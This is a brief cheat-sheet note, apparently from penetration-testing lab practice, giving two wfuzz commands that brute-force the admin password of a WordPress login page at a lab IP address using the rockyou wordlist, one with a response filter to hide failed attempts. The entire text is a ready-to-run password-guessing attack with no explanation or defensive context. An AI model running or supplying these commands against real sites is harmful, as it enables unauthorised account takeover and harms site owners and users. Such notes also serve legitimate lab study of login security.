Brute forcing http-post-forms:

wfuzz -w /usr/share/wordlists/rockyou.txt -c -d "log=admin&pwd=FUZZ" <http://10.11.1.251/wp/wp-login.php>
wfuzz -w /usr/share/wordlists/rockyou.txt -c --hw 254 -d "log=admin&pwd=FUZZ" <http://10.11.1.251/wp/wp-login.php>


